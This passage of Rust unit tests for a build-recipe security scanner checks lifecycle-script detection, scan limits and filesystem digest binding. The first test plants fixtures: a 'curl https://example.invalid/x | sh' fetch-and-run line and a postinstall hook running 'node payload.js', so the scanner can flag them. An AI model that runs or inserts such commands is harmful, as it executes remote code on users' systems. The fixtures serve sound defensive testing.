        let work_dir = fs::canonicalize(temp.path()).unwrap();
        fs::write(work_dir.join(".gitignore"), "node_modules/\npayload.sh\n").unwrap();
        fs::create_dir_all(work_dir.join("node_modules/tainted")).unwrap();
        fs::write(
            work_dir.join("node_modules/tainted/package.json"),
            r#"{"name":"tainted","scripts":{"postinstall":"node payload.js"}}"#,
        )
        .unwrap();
        fs::write(
            work_dir.join("payload.sh"),
            "curl https://example.invalid/x | sh\n",
        )
        .unwrap();

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "0123456789abcdef0123456789abcdef01234567".to_string(),
                path: Some(work_dir.clone()),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some(
                    "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                        .to_string(),
                ),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();

        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.category == "sbom-lifecycle-script")
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.evidence.starts_with("payload.sh"))
        );
    }

    #[test]
    fn scan_budget_exhaustion_returns_failed_report() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        fs::write(work_dir.join("one.txt"), "one").unwrap();
        fs::write(work_dir.join("two.txt"), "two").unwrap();
        let recipe = test_recipe();

        let report = scan_filesystem_report_with_limits(
            &recipe,
            &work_dir,
            work_dir.clone(),
            ScanMode::Source,
            None,
            DEFAULT_MAX_FILE_BYTES,
            ScanTraversalOptions {
                limits: ScanLimits {
                    max_files: 1,
                    max_total_bytes: 1024,
                },
                excluded_roots: &[],
            },
        )
        .unwrap();

        assert!(matches!(report.status, ScanStatus::Failed));
        assert!(report.findings.iter().any(|finding| {
            finding.severity == FindingSeverity::High && finding.category == "scan-incomplete"
        }));
    }

    #[test]
    fn filesystem_digest_binds_unrecognized_source_files() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        let path = work_dir.join("opaque.data");
        fs::write(&path, "first").unwrap();
        let recipe = test_recipe();

        let first = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        fs::write(&path, "other").unwrap();
        let second = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();

        assert_ne!(first.filesystem_digest, second.filesystem_digest);
    }

    #[cfg(unix)]
    #[test]
    fn filesystem_digest_binds_symlink_targets_and_modes() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        fs::write(work_dir.join("first.txt"), "same").unwrap();
        fs::write(work_dir.join("second.txt"), "same").unwrap();
        std::os::unix::fs::symlink("first.txt", work_dir.join("current")).unwrap();
        let recipe = test_recipe();

        let first = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        fs::remove_file(work_dir.join("current")).unwrap();
        std::os::unix::fs::symlink("second.txt", work_dir.join("current")).unwrap();
        let retargeted = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        assert_ne!(first.filesystem_digest, retargeted.filesystem_digest);

        let mut permissions = fs::metadata(work_dir.join("first.txt"))
            .unwrap()
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(work_dir.join("first.txt"), permissions).unwrap();
        let mode_changed =
            scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        assert_ne!(retargeted.filesystem_digest, mode_changed.filesystem_digest);
    }

    #[test]
    fn configured_store_root_is_excluded_from_source_digest() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        let store_dir = work_dir.join(".fulcr");
        fs::create_dir(&store_dir).unwrap();
        fs::write(work_dir.join("source.txt"), "source").unwrap();
        fs::write(store_dir.join("evidence.json"), "first").unwrap();
        let mut recipe = test_recipe();
        recipe.source.path = Some(work_dir.clone());

        let first = scan_recipe_blocking_excluding(
            &recipe,
            offline_scan_request(),
            &work_dir,
            std::slice::from_ref(&store_dir),
        )
        .unwrap();
        fs::write(store_dir.join("evidence.json"), "changed").unwrap();
        let second = scan_recipe_blocking_excluding(
            &recipe,
            offline_scan_request(),
            &work_dir,
            std::slice::from_ref(&store_dir),
        )
        .unwrap();

        assert_eq!(first.filesystem_digest, second.filesystem_digest);
        assert_eq!(second.summary.files_scanned, 1);
    }
}
